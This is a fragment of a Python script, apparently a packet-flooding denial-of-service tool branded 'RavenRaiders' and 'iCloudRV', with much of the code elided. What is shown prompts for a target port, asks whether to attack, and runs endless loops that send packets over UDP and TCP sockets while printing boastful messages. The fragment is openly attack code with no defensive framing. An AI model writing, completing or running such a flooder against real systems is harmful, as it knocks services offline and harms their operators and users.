...
port = int(input(" PORT:"))
choice = str(input(" Attack With RavenRaiders(y/n):"))
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PACKETS FROM Raiders!!!")
		except:
			s.close()
			print("[Attack]RavenRaiders !!!")
...
def run2():
	...
	while True:
		try:
			...
			for x in range(times):
				s.send(data)
			print(i +" PACKETS FROM iCloudRV!!!")
		except:
			s.close()
			print("[iCloudRV]Raiders!!!")
